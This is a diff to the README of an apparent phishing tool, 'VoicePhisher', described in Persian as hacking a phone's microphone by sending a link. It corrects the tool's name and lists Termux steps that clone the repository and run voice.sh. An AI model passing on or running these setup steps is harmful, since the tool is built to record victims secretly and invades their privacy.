@@ -1,4 +1,4 @@
-# VoicePhiser
+# VoicePhisher
 T.ME/KILLGERHACK
 هک میکروفون گوشی با ارسال لینک            
 
@@ -10,9 +10,9 @@ apt upgrade
 <br>
 pkg  install  wget  php  git openssl 
 <br>
-git  clone https://github.com/KillgerHack/VoicePhiser
+git  clone https://github.com/KillgerHack/VoicePhisher
 <br>
-cd VoicePhish  
+cd VoicePhisher 
 <br>
 bash voice.sh  
 
